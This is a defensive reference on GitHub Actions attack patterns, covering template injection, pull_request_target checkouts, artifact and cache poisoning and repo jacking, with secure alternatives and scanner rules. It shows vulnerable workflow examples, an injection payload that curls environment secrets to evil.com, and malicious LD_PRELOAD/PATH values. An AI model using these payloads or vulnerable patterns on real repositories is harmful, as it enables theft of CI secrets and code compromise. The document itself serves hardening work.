# Attack Patterns Reference

Detailed exploitation techniques, vulnerable code patterns, and secure
alternatives for GitHub Actions workflows.

---

## Table of Contents

- [Script Injection via Template Expansion](#script-injection-via-template-expansion)
- [Pwn Request (pull_request_target + Checkout)](#pwn-request)
- [workflow_run Privilege Escalation](#workflow_run-privilege-escalation)
- [GITHUB_ENV / GITHUB_PATH Injection](#github_env--github_path-injection)
- [Artifact Poisoning](#artifact-poisoning)
- [Repo Jacking](#repo-jacking)
- [Confused Deputy (Bot Condition Bypass)](#confused-deputy)
- [Cache Poisoning](#cache-poisoning)
- [Attack Surface Summary](#attack-surface-summary)

---

## Script Injection via Template Expansion

### How It Works

`${{ }}` expressions are evaluated and substituted **before** the shell
sees the script. Attacker-controlled values become part of the shell command.

### Injectable Contexts (Complete List)

Fields that should always be treated as untrusted:

- `github.event.pull_request.title` / `.body` / `.head.ref` / `.head.label`
- `github.event.issue.title` / `.body`
- `github.event.comment.body`
- `github.event.discussion.title` / `.body`
- `github.event.review.body` / `github.event.review_comment.body`
- `github.event.pages[*].page_name`
- `github.event.commits[*].message` / `.author.email` / `.author.name`
- `github.head_ref`
- `github.event.inputs.*` (workflow_dispatch — caller-supplied)

**Rule of thumb:** Anything ending in `body`, `title`, `ref`, `name`,
`message`, `email`, `label`, `page_name` is attacker-controllable.

### Vulnerable Pattern

```yaml
- name: Check PR title
  run: echo "PR title is ${{ github.event.pull_request.title }}"
  # Attacker sets title to: a]"; curl https://evil.com/$(printenv|base64); echo "
```

Shell quoting does NOT help — injection happens at template rendering time,
before the shell interprets the script.

### Secure Pattern

```yaml
- name: Check PR title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title is $PR_TITLE"
```

The `env:` mapping passes the value as an OS-level environment variable.
The shell reads `$PR_TITLE` — no template substitution occurs in the `run:` block.

**Alternative:** Use a JavaScript action where input is passed as an argument,
never entering a shell interpreter.

---

## Pwn Request

### pull_request_target + Checkout = RCE with Secrets

`pull_request_target` runs in the **base repository context** with:
- Write-scoped `GITHUB_TOKEN`
- Access to all repository secrets
- Even when triggered by a fork PR

If the workflow checks out the PR head, attacker code executes with full
privileged access.

### Attack Chain

1. Attacker forks the target repository
2. Modifies build scripts (`package.json` postinstall, `Makefile`, `setup.py`)
3. Opens a PR
4. `pull_request_target` workflow fires in base repo context
5. Workflow checks out `github.event.pull_request.head.ref` (attacker code)
6. Build/test step runs attacker's code with secrets

### Vulnerable Pattern

```yaml
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<SHA>
        with:
          ref: ${{ github.event.pull_request.head.ref }}  # ATTACKER CODE
      - run: npm install    # executes attacker's postinstall hook
```

### Payload Vectors in Checked-Out PR Code

- `package.json` preinstall/postinstall hooks
- `Makefile` install/test targets
- `setup.py` cmdclass overrides
- `Gemfile` / `Podfile` post-install hooks
- Any file a subsequent `run:` step sources or executes

### Secure Alternatives

**Option A — Use `pull_request` (no secrets, read-only):**
```yaml
on: [pull_request]
steps:
  - uses: actions/checkout@<SHA>   # fork code, safely sandboxed
  - run: npm test
```

**Option B — Split workflow (untrusted → artifact → privileged):**
```yaml
# Step 1: pull_request (unprivileged)
on: [pull_request]
steps:
  - run: npm test
  - run: echo "${{ github.event.number }}" > pr-number.txt
  - uses: actions/upload-artifact@v4
    with:
      name: pr-data
      path: pr-number.txt

# Step 2: workflow_run (privileged, no code execution)
on:
  workflow_run:
    workflows: ["CI"]
    types: [completed]
permissions:
  pull-requests: write
steps:
  - uses: actions/download-artifact@v4
    with:
      path: /tmp/pr-data
  - run: |
      PR=$(cat /tmp/pr-data/pr-data/pr-number.txt)
      [[ "$PR" =~ ^[0-9]+$ ]] || exit 1   # validate
```

**Option C — Label-only (no checkout):**
```yaml
on: pull_request_target
permissions:
  pull-requests: write
  contents: none
steps:
  - uses: actions/labeler@<SHA>   # no code checkout
```

### Real-World Impact

Orca Security found ~50 exploitable repos out of 5,000 using `pull_request_target`.
Microsoft Symphony was demonstrated to allow reverse shell → code push to origin.
Additional vulnerable repos found at Google, Nvidia, Fortune-500 organizations.

---

## workflow_run Privilege Escalation

### How It Works

`workflow_run` executes in the **base repository context** (secrets, write
token) even when triggered by a fork PR's workflow. Artifacts from the
unprivileged triggering workflow cross a trust boundary.

### Attack Chain

1. Attacker opens fork PR — `pull_request` CI runs (no secrets)
2. CI uploads malicious artifact (e.g., deploy script, config file)
3. `workflow_run` triggers in base repo (has secrets, write access)
4. `workflow_run` downloads and uses artifact without validation
5. Attacker achieves code execution in privileged context

### Vulnerable Pattern

```yaml
on:
  workflow_run:
    workflows: ["CI"]
    types: [completed]

steps:
  - uses: dawidd6/action-download-artifact@v2
    with:
      workflow: ci.yml
  - run: |
      chmod +x ./deploy.sh
      ./deploy.sh          # EXECUTING ATTACKER CONTENT
    env:
      SECRET: ${{ secrets.PRODUCTION_SECRET }}
```

### Secure Pattern

```yaml
on:
  workflow_run:
    workflows: ["CI"]
    types: [completed]

permissions:
  contents: read
  pull-requests: write

steps:
  - uses: actions/download-artifact@v4
    with:
      path: /tmp/artifacts     # isolated path

  - run: |
      PR=$(cat /tmp/artifacts/pr-number/number.txt)
      [[ "$PR" =~ ^[0-9]+$ ]] || exit 1
      # NEVER execute scripts from artifacts
      # ONLY read structured data (numbers, scores)
```

### Key Insight

The `dawidd6/action-download-artifact` third-party action is particularly
common in vulnerable configurations because it simplifies cross-workflow
artifact downloads without surfacing security implications.

---

## GITHUB_ENV / GITHUB_PATH Injection

### How It Works

Writing attacker-controlled content to `$GITHUB_ENV` or `$GITHUB_PATH`
allows setting arbitrary environment variables for all subsequent steps.

### Attack Vector

```yaml
# VULNERABLE: artifact content written to GITHUB_ENV
- run: cat ./artifact/env-vars.txt >> $GITHUB_ENV
```

If `env-vars.txt` contains:
```
PATH=/tmp/evil:$PATH
LD_PRELOAD=/tmp/evil/hook.so
```

All subsequent steps execute with the attacker's environment.

### Deprecated `set-env` Command

The `::set-env name=VAR::value` workflow command was disabled due to injection
risk. If `ACTIONS_ALLOW_UNSECURE_COMMANDS=true` is set, it re-enables these
commands — a direct injection path. Found in real-world workflows (Alibaba
nacos, others).

### Mitigation

- Never write untrusted data to `$GITHUB_ENV` or `$GITHUB_PATH`
- Validate all input before appending
- Never set `ACTIONS_ALLOW_UNSECURE_COMMANDS=true`

---

## Artifact Poisoning

### How It Works (Path Traversal)

A low-privilege workflow uploads an artifact with path-traversal filenames
(e.g., `../../runner/scripts/post-run.sh`). A privileged `workflow_run`
extracts it, overwriting sensitive runner files.

### CVE Reference

GHSA-cj34-9v6h-grxm (Google Security Research, June 2024): Path traversal
in artifact download action allowed privilege escalation from unprivileged
fork context to privileged `workflow_run` context.

### Mitigation

- Always extract artifacts to `/tmp/artifact-scratch/` — never workspace root
- Validate artifact filenames and file types before extraction
- Pin artifact actions to verified SHA
- Treat all artifact content as untrusted regardless of source workflow

---

## Repo Jacking

### How It Works

A workflow references `some-org/some-action@v1`. If `some-org` is a deleted
or renamed GitHub organization/user, an attacker registers that namespace and
publishes a malicious action under the same path.

### Real-World Examples

Synacktiv demonstrated repo jacking affecting workflows in: Azure, Swagger,
Firebase, Alibaba, and other organizations.

### Detection

- Snyk scanner `REPOJACKABLE` rule
- Synacktiv Octoscan
- Periodic audit of all `uses:` references against live GitHub orgs

### Mitigation

SHA-pinning provides partial protection (the SHA won't exist in the attacker's
new repo), but the workflow will fail rather than execute malicious code.

---

## Confused Deputy

### Bot Condition Bypass

Workflows that use `github.actor == 'dependabot[bot]'` to gate privileged
operations are vulnerable. `github.actor` reflects the **last actor to touch
the event**, not the original creator.

### Attack

Attacker crafts a fork PR where the last commit is authored by a trusted bot,
tricking the workflow into auto-merging attacker code.

### Detection

- Zizmor `bot-conditions` rule
- Poutine `confused_deputy_auto_merge` rule

---

## Cache Poisoning

### How It Works

Fork PRs can contribute content to GitHub Actions caches that are later
restored by privileged workflows.

1. Attacker opens fork PR — CI runs, writes malicious content to cache
2. A privileged `workflow_run` or release workflow restores the cache
3. Malicious cached content influences the build

### Mitigation

- Do not restore caches in release workflows from branches accepting fork PRs
- Use narrow cache key scopes
- Zizmor `cache-poisoning` rule detects this pattern

---

## Attack Surface Summary

| Surface | Trust Boundary | Detection |
|---------|---------------|-----------|
| `${{ }}` in `run:` | Template → shell | Zizmor `template-injection`, actionlint `untrusted-inputs`, Poutine `injection` |
| `pull_request_target` + checkout | Fork code → privileged runner | Zizmor `dangerous-triggers`, Scorecard `Dangerous-Workflow`, Snyk `PWN_REQUEST` |
| `workflow_run` + artifact | Artifact content → privileged context | Zizmor `dangerous-triggers`, Snyk `WORKFLOW_RUN`, Raven graph |
| `$GITHUB_ENV` writes | Untrusted data → environment | Zizmor `github-env` |
| Action tags | Mutable ref → immutable expectation | Zizmor `unpinned-uses`, Scorecard `Pinned-Dependencies`, Snyk `UNPINNED_ACTION` |
| Renamed orgs | Dead namespace → attacker ownership | Snyk `REPOJACKABLE`, Octoscan |
| Self-hosted runners | Workflow code → internal network | Zizmor `self-hosted-runner`, Poutine `pr_runs_on_self_hosted` |
| Action cache | Fork content → privileged restore | Zizmor `cache-poisoning` |
| `GITHUB_TOKEN` scope | Broad perms → compromised step | Zizmor `excessive-permissions`, Scorecard `Token-Permissions` |
